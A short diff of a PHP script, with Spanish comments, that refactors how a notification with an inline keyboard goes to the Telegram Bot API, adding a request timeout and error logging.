@@ -75,19 +75,29 @@ $msg .= "🆔 ID: $id";
     ]
 ];
 
-        $data = [
-            "chat_id" => $chat_id,
-            "text" => $msg,
-            "reply_markup" => json_encode($keyboard)
-        ];
+        // 🚀 ENVÍO A TELEGRAM (SEGURO)
+$ch = curl_init();
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$token/sendMessage");
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
+curl_setopt_array($ch, [
+    CURLOPT_URL => "https://api.telegram.org/bot$token/sendMessage",
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => [
+        "chat_id" => $chat_id,
+        "text" => $msg,
+        "reply_markup" => json_encode($keyboard)
+    ],
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 10
+]);
+
+$response = curl_exec($ch);
+
+// 🔍 DEBUG OCULTO
+if(curl_errno($ch)){
+    error_log("Telegram Error: " . curl_error($ch));
+}
+
+curl_close($ch);
     }
 
 echo "OK";
